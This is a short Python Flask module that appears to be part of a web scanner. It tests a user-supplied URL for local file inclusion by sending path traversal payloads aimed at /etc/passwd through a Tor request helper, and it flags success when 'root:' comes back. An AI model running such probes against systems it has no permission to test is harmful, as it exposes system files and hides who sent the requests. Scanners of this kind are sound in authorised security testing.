from flask import Blueprint, request, render_template
import tor_utils

lfi_bp = Blueprint('lfi', __name__, template_folder='templates')
tests = ["../../etc/passwd", "../etc/passwd", "..%2f..%2fetc%2fpasswd"]

@lfi_bp.route('/lfi', methods=['GET', 'POST'])
def lfi():
    result = None
    if request.method == 'POST':
        url = request.form.get('url')
        for payload in tests:
            resp = tor_utils.safe_get(f"{url}?file={payload}")
            if "root:" in resp:
                result = f"LFI via payload {payload}"
                break
        if not result:
            result = "No LFI detected."
    return render_template('lfi.html', result=result)